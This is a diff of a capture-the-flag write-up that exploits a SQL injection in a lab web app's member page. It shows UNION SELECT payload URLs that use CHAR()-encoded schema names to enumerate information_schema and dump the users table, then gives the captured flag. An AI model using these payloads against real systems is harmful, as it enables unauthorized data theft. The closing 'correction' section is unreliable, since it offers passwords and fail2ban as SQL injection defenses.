@@ -1,16 +1,21 @@
-Member_Sql_Injection
+# Member Sql Injection
+
+SQL injection usually occurs when you ask a user for input, like their username/userid, 
+and instead of a name/id, the user gives you an SQL statement that you will unknowingly 
+run on your database.
+
+## Notes
 
 CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110))
 
 ----------------------------------------------------
 
-
+```bash
 http://192.168.1.34/index.php
 ?page=member
 &id=-1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110))
 &Submit=Submit 
-
-
+```
 
 ID: -1 union select column_name,0 from information_schema.columns where table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110)) 
 First name: user_id
@@ -40,23 +45,26 @@ Surname : 0
 
 ---------------------------------------------------
 
+```bash
 http://192.168.1.34/index.php
 ?page=member
 &id=-1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(83), CHAR(113), CHAR(108), CHAR(95), CHAR(73), CHAR(110), CHAR(106), CHAR(101), CHAR(99), CHAR(116), CHAR(105), CHAR(111), CHAR(110))
 &Submit=Submit
+```
 
 First name: 
-
 Surname : users
 
 ----------------------------------------------------
 
 we found in 
 
+```bash
 http://192.168.1.34/index.php
 ?page=member
 &id=-1 union select Commentaire, countersign from Member_Sql_Injection.users
 &Submit=Submit
+```
 
 this: 
 
@@ -73,4 +81,4 @@ the flag is 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
 ## Correction
 
-Bloquer les injections SQL, forcer l'utilisation d'un mot de passe fort et bloquer au bout de 3 tentatives par exemple les connexions (voir fail2ban).
+We need to block SQL in different ways, one of the more commun in to force to the user to have difficult password adding to the code for example: 1 letter A, 1 signe, etc... have one authentificator is a good idea swell or email connection sending, have maximum of try (3 attempts), fail2ban.
